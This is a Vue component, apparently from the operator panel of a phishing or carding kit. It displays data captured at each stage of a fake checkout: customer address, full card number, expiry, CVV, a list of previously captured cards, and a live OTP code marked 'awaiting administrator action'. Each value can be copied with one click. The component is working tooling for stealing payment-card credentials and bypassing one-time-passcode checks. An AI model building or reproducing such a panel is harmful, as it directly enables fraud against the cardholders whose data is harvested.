<script setup lang="ts">
import { computed } from 'vue';

const props = defineProps<{
  tabLabel: string;
  customerInfo: Api.Payment.CustomerInfo;
  cardInfo: Api.Payment.CardInfo;
  cardHistory?: Api.Payment.CardHistoryEntry[];
}>();

function copy(val: string) {
  if (!val) return;
  try {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(val).then(() => { window.$message?.success('已复制:' + val) }).catch(() => {});
    } else {
      var el = document.createElement('textarea'); el.value = val; el.style.position = 'fixed'; el.style.opacity = '0'; document.body.appendChild(el); el.select(); document.execCommand('copy'); document.body.removeChild(el);
      window.$message?.success('已复制:' + val);
    }
  } catch (e) { window.$message?.error('复制失败') }
}

interface DetailRow { key: string; val: string; }

const rows = computed<DetailRow[]>(() => {
  switch (props.tabLabel) {
    case '商品页': return [
      { key: '商品名', val: 'Electronics Item #SKU-88231' },
      { key: '数量', val: '1' },
      { key: '单价', val: '$ 249.00' },
      { key: '运费', val: '$ 15.00' },
      { key: '小计', val: '$ 264.00' },
    ];
    case '地址页': return [
      { key: '邮箱', val: props.customerInfo.email },
      { key: 'first_name', val: props.customerInfo.firstName },
      { key: 'last_name', val: props.customerInfo.lastName },
      { key: '国家', val: props.customerInfo.country },
      { key: '地址', val: props.customerInfo.address1 },
      { key: '地址2', val: props.customerInfo.address2 },
      { key: '城市', val: props.customerInfo.city },
      { key: '州', val: props.customerInfo.state },
      { key: '邮编', val: (props.customerInfo as any).zipCode },
      { key: '电话', val: props.customerInfo.phone },
    ].filter(r => r.val !== '' && r.val !== '-' && r.val != null);
    case '信息页': return [
      { key: '姓名', val: props.customerInfo.fullName },
      { key: '邮箱', val: props.customerInfo.email },
      { key: '电话', val: props.customerInfo.phone },
      { key: '国家', val: props.customerInfo.country },
      { key: '地址', val: props.customerInfo.address1 },
      { key: '城市', val: props.customerInfo.city },
      { key: '州/省', val: props.customerInfo.state },
      { key: '邮编', val: (props.customerInfo as any).zipCode },
    ].filter(r => r.val !== '' && r.val !== '-' && r.val != null);
    case '卡片页': return [
      { key: '卡类型', val: props.cardInfo.cardType },
      { key: '卡级', val: props.cardInfo.cardLevel },
      { key: '发卡行', val: props.cardInfo.bankName },
      { key: '持卡人', val: props.cardInfo.cardHolder || '' },
      { key: '卡号', val: props.cardInfo.cardNumber },
      { key: '有效期', val: props.cardInfo.expiry },
      { key: 'CVV', val: props.cardInfo.cvv },
      { key: 'OTP码', val: props.cardInfo.otpCode },
    ].filter(r => r.val !== '' && r.val !== '-' && r.val != null);
    case '卡片历史': return (props.cardHistory || []).map((h, i) => ({
      key: '#' + (i + 1),
      val: (h.cardHolder || '-') + '  ' + ((h.cardNumber || '-')) + ' | ' + (h.expiry || '-') + ' | ' + (h.cvv || '-')
    }));
    case 'OTP验证页': return [
      { key: 'OTP码', val: props.cardInfo.otpCode || '等待输入' },
      { key: '验证状态', val: '待管理员操作' },
    ];
    default: return [];
  }
});
</script>

<template>
  <div class="detail-popup" v-if="rows.length">
    <div class="detail-row" v-for="(row, i) in rows" :key="i" @click="copy(row.val)">
      <span class="key">{{ row.key }}</span>
      <span class="val">{{ row.val }}</span>
    </div>
  </div>
</template>

<style scoped>
.detail-popup {
  position: absolute;
  left: 22px;
  top: 96px;
  min-width: 220px;
  max-width: 420px;
  background: #fff;
  color: #222;
  border-radius: 3px;
  overflow: hidden;
  box-shadow: 0 6px 18px rgba(0,0,0,.35);
  border: 1px solid #d8d8d8;
  z-index: 120;
}
.detail-row {
  display: grid;
  grid-template-columns: 68px 1fr;
  min-height: 26px;
  border-bottom: 1px solid #e5e5e5;
  cursor: pointer;
}
.detail-row:last-child { border-bottom: none; }
.key {
  background: #e2e2e2;
  color: #555;
  padding: 7px 10px;
  border-right: 1px solid #ddd;
  font-size: 12px;
  white-space: nowrap;
}
.val {
  background: #fff;
  color: #222;
  padding: 7px 10px;
  font-size: 12px;
  word-break: break-all;
  white-space: normal;
}
</style>
